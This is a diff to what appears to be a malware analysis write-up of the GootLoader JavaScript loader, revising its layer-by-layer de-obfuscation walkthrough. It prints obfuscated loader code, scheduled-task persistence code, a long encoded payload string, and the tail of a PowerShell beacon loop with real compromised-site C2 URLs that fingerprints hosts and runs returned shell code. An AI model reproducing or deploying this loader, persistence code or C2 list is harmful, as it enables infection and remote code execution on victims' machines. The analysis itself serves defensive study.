@@ -12,21 +12,22 @@ The extracted code can be found [here](./assets/files/gootloader/gootloader.scri
 
 ## First Layer
 
-SHA1: 88c2d3d033759e30f3dd150570b4e19bf92cd3bb
-
 The entry point is the calling of the coolj function which in turn calls the amqiinf function. (ojnoa function always returns a true)
 
 ```js
-***TODO***
-// Javascript code with syntax highlighting.
-var fun = function lang(l) {
-  dateformat.i18n = require('./lang/' + l)
-  return true;
+coolj(3845);
+
+function coolj(xfeys, animald, noon1, tnkob) {
+  if (ojnoa(xbkvlmtp)) {
+    amqiinf(travel8);
+  } else {
+    txEKt();
+  }
 }
 ```
 
 amqiinf function contains a infinite while (electric2g is always true) loop with a try catch statement in its body. The catch statement saves a pointer to 
-function qqxhouk in the variable array travel8[1638792]. The try statement attempts to execute what ever that is referenced in travel8[stead8] and stead8 is 
+function qqxhouk in the variable array travel8[1638792]. The try statement attempts to execute whatever that is referenced in travel8[stead8] and stead8 is 
 incremented on every while loop(stead8's initial value is 152). These are the functions in the order they are called:
 
 1. travel18[1638792]=qqxhouk
@@ -42,8 +43,9 @@ Summarising what each of the four function does:
 * rain4 - Calls txeic[3]\(txeic[1])(travel8); 
 
 ndplk is actually an encrypted script. It is decrypted by the meeth0 (a pointer to meeth0 is saved in the variable flower7) function and is saved in the 
-variable txeic:
+variable txeic. The result is the layer 2 code.
 
+## Second Layer
 ```js
 constructor,ubwojcfaywmnbpcig=7327;
 o=49-46;
@@ -57,9 +59,9 @@ psudexudc=txeic;,,qqxhouk()
 
 txeic is as an array and delmited by commas. So txeic[3] is qqxhouk() and txeic[1] is the main body of decrypted ndplk variable. Another encrypted string is 
 contained in the main body and goes through another round of decryption by meeth0 (remember that flower7 now is a pointer to meeth0). The decrypted 
-content is yet another script, which is the second layer.
+content is yet another script, which is the third layer.
 
-SHA1: 7df434a70639e15f32e945cf3d2ac718e29c6808
+## Third Layer
 
 Function F is called several times with a number as an input. Analysis of function F shows that it returns a concatenated substring from the variable 
 "qTERF" base on the input number. Replacing the F function calls with the return strings makes it more readable.
@@ -98,7 +100,7 @@ scheduledtask_handler["settings"]["StartWhenAvailable"] = true;
 ```
 
 Remember the other variable names that were not referenced in the initial script? The variables are instead referenced here. flower7 or meeth0 is called 
-again to decrypt the last encrypted string and this gives the second stage javascript.
+again to decrypt the last encrypted string.
 ```js
 Decrypted_string = flower7
 (distantk+eight1+ybefhu+originaln+are0+were1+tswyh+boardd+camev+stretch2+rollgk2+hjmsd+ftwrdr+city0+axruiwcvk+rx
@@ -149,17 +151,58 @@ Schedule_Service_func_getFolder["RegisterTaskDefinition"](IBM_Rational_Tools_str
 Schedule_Service_func_getFolder_GetTask = Schedule_Service_func_getFolder["GetTask"](IBM_Rational_Tools_str);
 Schedule_Service_func_getFolder_GetTask["RunEx"](null, 2, 0, "");
 ```
-## Second Layer
+## Fourth Layer
 
-SHA1: e560abeebd6d6ebb000937cf1772eb1811f61a61
+Decrypted_string appears in the same format at the first layer. With partial strings assigned to random named variables and a few function declaractions
 
-The steps to de-obfuscate is the same as the first stage (Same concept, just different variable and function names). Second de-obfuscated script in-memory is:
+Random named variables:
+```js
+...
+zgcxeuq = 'E\'5\\tm,US\'7\\yx7+SG/\'[\\7b\\S\'h)Z+.]I\\U\'f(S \'M\\=e[';
+hiysr = '$Wcv\'S\\$pc+;rr\')\\il)_pmn.txo';
+weight3 = '+]0l\\\'\'\\}/|+\\/\'\'S\\;:p)psG(=p(\'(\\Wt(+\\t\'\'\\\\\'\'+';
+bufye = [8081];
+wayb = 'b\'\\\\\'\'O\\++t+\\\'\'\\:\'S\\:I\\S\'\']\\+et+\\\'\'\\r\'l\\E+e{V\'\\\\\')nc+3ou\\ \'RcQei.\'\\\\\'T';
+sinceq = 'RUHDSQJb';
+shello = '$\\\'\'\\e_++m.\\\'\'\\A\'n\\\\l\'+\\r\'\'+\\+o\\(\'l\\$\'on\'a\\|cm+k/\\\'\'\\n/+FI:\\N\'slZEpSMWtI';
+type9 = '$RExTtreRsT\\U\'\'p\\)EI+[}z\'M\\G;[S.$p.nM]OOU';
+producem = 'e0)i],)O:1\'j\\3::+-t:\'5\\]L)(GS]dn\'[\\\\n\'+Me+\'[\\\\o\'1';
+shoulder3 = '\\\\h\'+\\\"\'\\M\'p\\E,\\E\'\"\\\\\'\'+\\+p\\+\'h\\\'\'\\tpTl\\.\'\'S\\+cy+\\p\'\'S\\fr\\s\'l\\E\'m+\'+\\\\x\'+\\/\'\'E\\UmL{\\o\'\'I\\+cf+\\.\'\'\\\\\'\'L\\+\"\\\\\'+\\3\'\'+\\s\"\\\\\'bI+Li|';
+...
+```
+
+Random named functions:
+```js
+...
+function yzxji(told1, feetk, experiment4, bahjj) {
+  wife6 = told1.length;
+  return wife6;
+}
+
+function wait4(crease9, expectv, may1, changel, pqqq) {
+  heardm = "";
+  for (happenq = nxou; happenq < 6706; happenq++) {
+    rememberu = listenc(crease9, happenq);
+    heardm = supporto(heardm, rememberu, happenq);
+  }
+  return heardm;
+}
+...
+```
+
+The steps to de-obfuscate is the same as previously mentioned(Same concept, just different variable and function names). This returns the fifth layer.
+
+## Fifth Layer
+
 ```js
 constructor,tjqzhxosf=5018;f=52-49;nor8=987;try{ eye7[f](causey('\'x+G\'bUhM.$k;E\"\'6+3\'.E7P3A5l/IiVrea=\'0+;\'\'f+a\'S$ M0U.x0G.b0\'.+7\'0h1./H\'\'++\'\'eEm\'o+r\'haCd \')+o\'\'e+\'\'+k\'cReSG. Ae\'k+i\'ld\'D+(\'\" C,oLoMkTiHeK\'(+ \'6:3 \'$+f\'I.Z7S3m5s/ut\'i+\'\'+=\'$KPbxeTWkexl;p p$\'f+\'\'+A\' I)Z4S6\'x+ \';m4s6\'n+i\'Wu `;1\'=+$\'v0Y.Y0\'1+ \'TeNq ysY\';+ \'$w\'o+d\'nfi\'W+(\' I0Z.S5m/s\'u+`\'2a=l$lRiAzAoqMc\"\'=+\'\'+y\'\'t+N\'eU\'u+\'\'+g\'A;R \'$+\'\'+e\'SfUI.ZhSb\'G+x\'Um\'s+u\'`M3$=;$)VRfnGxPrax;$ ($ef\'I+Z\'STmasEuR`\'4+=\'$Cb:V:l]\'\'++\'\'CT\'S+e\'UCQ\"E)r;B\'\'++\'\'$eSwM.J\'q+M\'=TneeNW\'-+o\'B.jMeEc\'t+ \'StysSy\'s+[\'=thebmG\'\'++\'\'.xIUOM.$S;\'}+E\'UTRrTE$A{m=r ek\'c+A\'bALdlEarC N$OMiUTx\'G+b\'\'a+D\'\'h+\'\'+I\'l.AgVeeT\'r+e\'StP\'o+n\'Sa\'\'++\'\'eC(I)\'.+g\'eFTIRt\'r+E\'cerSepvoR\'E+s\':N:s]\'R+e\'geaSnTaRm\'\'++\'\'eTANmI(O)p;E$CHiS\'q+F\'LV=R(\'\'++\'\'e$S\'.+\'\'+S\'MtJEqNM[.\'\'++\'\';R2E\'a+d\'t1o\'e+n\'dS(L\'t+:\':)])e p-yS\'p+l\'ITTl O$CfOI\'Z+S\'mTsour;PI\'f+(\'$yHTSIqr\'u+c\'eFsL..TceON\'[+ \'=u nLTo\'c+o\'T O-ReP\'Y+T\'iQR u3c)\'{+\'\'+e\'SI\'\'++\'\':e:x](R$EHgSAqN\'\'++\'\'FaLM\'T+N\'\'[+1\']I o-preEcPILVArC\'e+\'\'+e\'\' +\'\'+s\'.\"T\\e^N\"\',+\"\'\"[)\';+}\'};W)\'}+\'\'+H\'iDLee\'(+1\')S{ut.r_\'$++\'\"Y^{\"Y+We\'M+a\'nS.l_H$G{m%(|@}(0\"0h0t0t5p sT\'g+-\' :E/E/RcFa\'p+\'\'+.\'_e$r{aecRkEihnWg|\'R+D\'g.\'c+o\'.(\'W+V\'szmaa/Ex\'m+l\'r=pCcC.\'\'++\'\'lp\'h+p\'\"V\'b+$\';,)\'}+}\')\"]h5\'[+n\'GtStMpZsN:F/\'/+c\'o$l(o\'r+l\'\'.+_\'$i+b\"\'3+\"\'\'.+c\'o{m\'/+x\'mElsr\'p+c\'.lp\'h+p\'\"E,\'\"+h\'\'}+)\'htTtap\'s+\'\'+p\'.:\'/+/\'v_\'\'++\'\'i$r(\'E+m\'AtnuEaLlItF\'T+E\'Gi:l:t].\'\'++\'\'hctoamp/.xOmil\'r+p\'c[.+p\"h\'p+\'\'+2\'\"\"{,)\")h]t6t[pnsG\'S+M\'\':+/\'/ZbNeFp$m(i.n_a$.(\'f+\'\'+v\'ni/e\'s+\'\'+x\'mller}p)\']+\'\'+c\'.5p[hnpG\'S+M\'Z\"\',+\"\'hNtFt$p(\'.+_\'$s\':+\'\'++\'\"/1\'\"+{\')/)s]e0x[m\'o+v\'ineGsSfM\'Z+N\'Fo$u(n.d_o$n(lfii\'e+s\'ln\'\'++\'\'ee}.)c]o5\'[+n\'Gm\'/+x\'\'S+M\'ZmNlFr\'p+c\'.$p(h\'p+\"\',.\"_h$t+t\"\'0+\"\'{p)s\':+/\'/)o]c4e[annGpSr\'e+z\'eMnZtNoFw$.\'p+l\'/(x.m_l\'r+p\'c$.(\'f+\'\'+p\'hip\'\"+,\'\"{\'%+|\'\'h+\'\'+)\'\'t+t\'p(s):\'/+/\'l]a3m[innGaSiMnZtNuFa$s\'t+\'\'+(\'.u)r)i0\'(+)\']a2\'[+n\'GsS.MeZsN/Fx$m(l.r)p\'c+.\'p)\'\'++\'\'h]p1\"[\'\'++\'\',n\"GhStMt\'p+s\':Z/N/Fz$\'(+ \'meo\'c+-\' lttcoed\'a+\'\'+j\'byo\'-+w\'e.nr(u(/(xWmVlsrmpa\'E+=\'\'c+.\'pa\'\'++\'\'hPpG\"f,V\'\'++\'\'\"$h;\')+}\'\'t+t\'\'E+l\'\'p+\'\'+t\'IsT:W\'o+D\'n/i/Wanci\'A+\'\'+t\'imv.._c$o\'.+\'\'++\'\"i^d\"/+x\'\'++\'\'emmlar\'p+\'\'+n\'.c_.\'p+h\'\'$+\'\'+p\'\"{\'%+|\'},\'\"+h\'tEtlpTsI\'t+W\'O:D/n\'I+W\'n/itahMe.w_a$r{zeoRneehhW\'|+\'\'+a\'csk\'e+r\'.Pcgo(m\'\'++\'\'W/Vxsmmlar\'p+c\'\'E+\'\'+.\'p=h\'p+\"\')u U|y cg\'e+t\'-qr\'a+n\'\'A+A\'Rd$O;M))}}ECMa\'t+\'\'+A\'NC.H_\'$+{\'%{|\'E+u\'Q}I;NSUL-E Eepm A\'n+ \'t-csE\'L+E\'S \'2+0\'}|\'S;ppG=((W(\'\'+s\'uV\'s)m+\'(+\'\'basEt=rY\'\')+)\';y qPe=Y(YWvS$c;r)i)pnto)i;tMp a=c \'\'+c\'r.E)a\'T+\'\'+m\'eEt\'s+y\'SogBnjietcaTr\\e\\psOh\'\'++\'\'_e2L3\'n+i\'WL\'\'++\'\' .\'\'++\'\'iam\'w+g\'(P+\'\"+^\'\'p+L\'\'I+M\'WiSCO\'\"+(\'+a)\'}+)\'eT\'i+O\'Nu\'l+\'\'+P\'OawvE.\'_+$\'+R\"S^\'\"++\'eH\'E+\'\'+m\'aln\'.+\'\'+L\'\'_+$\'(e{\'%+|\'}x9e9\' +t\'lc\'\'++\'\'-c shct\'g+\'\'+r\'\'n+e\'Li.pe\'u+l\'atvS.\'_+$\'{te\'\'++\'\'Dr\'e+\'\'+I\'Nh\'w+\'\'+s\'l|i:\'v+n\'ec erWi\'d+\'\'+r\'I(t(\'W+V\'sem\'a+E\'=LxiknT\'x+P\'$E;\'\'++\'\'O)\'\"+|\'\"P(\'t+i\'lEpnsS.C)r\"i\'\'++\'\'MpE\'\'++\'\'tT\'S+y\'Sf\'\'++\'\'EUL\'I+f\'\'L+\'\'+s\'IL|\'e+m\'An\'\'++\'\'na|mk\'n+I\'lESWI\'|+\'\'+s\'\'s+M\'ec\'\'++\'\'TRIi|\'E+C\'APP\'S+e\'mta\'n+|\'n.O\'I+t\'asc\'I+\'\'+H\'el\'p+p\'Al\'\'++\'\'.L\'l+a\'sL\'l+e\'htsI|\'r+e\'Dn\'\'++\'\'Ld\'e+x\'\'O+\'\'+O\'\'f+S\'If\"\'(+ \'=f\'u+\'\'+ \'nLG\'S+M\'\'L+\'\'+Z\'NNF\'$+}\')a)M(eysA\'\'++\'\'eraRraco\'T+\'\'+h\'\'.+Q\'eSg\'m+T\'lh\'E+l\'L$E(\'G+N\'IxR\'t+\'\'+e\'CSU4\'\'++\'\'T6\'e+s\'aEb\'O+t\':S:\']+t\'rlEeV\'n+o\'ce.\'M+e\'Tps\'Y;SP\'[+M\'[[p;])((7E3S+o6l5C,\'5+*\'1.)E]f(K1U1$1;1)1))\';+i\'fo(GPo[tMG[ppx]$(,7\"8!4|0\"/(7N0i,O1j3:-:5])G]n[\'M+[\'pI]r(t6S1[2\'0+/\'5(1e,T1\'*+6\')i]R(WM.[Epf]K(U1$1;4)4)/)2s6S,E5r+P2m)O)C!:=: ](e8d/o2M)N-o(I4S+S1E)R)\'{+ \'PP[MMO[\'p+]\'(C0.*n1o,i4S+s8E)r]\'(+M\'[ppm]\'(+4\'4O+C4.4O,\'1+3\'*I1.)M)E[tMS[YpS][(\'1+0\'*,4\',+1\'+Q3e)g]m(T\'\'p+o\'wle$r(smhAe\'l+l\'.EeRxtes\'p)I[zMG[.pn]O(i3s6\'++1\'5S,E5r+p0m)O]C[.Mo[ip.]\'(+1\'*M6e1t,s3Y*S3 )t]\'(+ \'LC)e;J}b oe-lWsEeN ({\' +d\' (=WPe[NM:[\'p+]\'(:4]1r+e3T3\',+6\'+I8r)w]\';+ \'Wm=A Edr[TMS[.po]i(.1M7\'6+-\'7E5t,S7y7S/[7\')+]\'( M=[ pE]\'(+7\'2f/K6U,\'2+-\'1$);)\';+ \'P)[(Mw[EpN]:(:0]*M1a,\'4++\'8e)R]t(\'M+[\'ps]y(r9\'1+/\'7O,M1e*m1.7o)i)\'[+M\'[.pM]E(t2S1Y*s6[, 3\'*+4\')=] (Q e\'gc\'s+c\'rmi\'p+t\'.Telx$e{\'),o\'G\"o\'t+Gdp[xM\'[+p\']$((1W4V*\'4+,\'5s*m1a)E] (nWo+i(t1\'*+1\')c)\'++\'\'\"n\'u f,;\'\"\"8\'1+Cd4[2ME[9pB]B(71\"4=*u4s,m5S*Z1\')+]\'(I0f,$W\'++(\'1{*)1R)n)x+\'\'+\"\'\'r,x $M([mpG]H(\'4+4\'+l2\'6+,\'6S-\'2+)\',W Y0 *n1o i)\';+ \'}tPc.nQuufi\'t (=) ;L '))();} catch(e) { }nkarhikqlhd=eye7;
 ```
-## Third Layer
 
-De-obfuscating this further gives the final in-memory javascript that calls powershell. After further tidying up and replacing the variable with actual values 
+De-obfuscating this further gives the final in-memory javascript (sixth-layer) that calls powershell. 
+
+## Sixth Layer
+
+After further tidying up and replacing the variable with actual values 
 (Taken from the M array) gives:
 
 ```ps
@@ -271,3 +314,9 @@ php","https://oceanprezentow.pl/xmlrpc.php","https://laminaintuasturias.es/xmlrp
  SLEEp -s 20
  }
 ```
+
+To summarise the functionality of the script above:
+1. One of the URLs is randomly selected
+2. A cookie header is populated with compressed encoded fingerprint data of the infected machine
+3. A HTTPS request with the cookie header is made to the URL
+4. Response is used to execute shell code
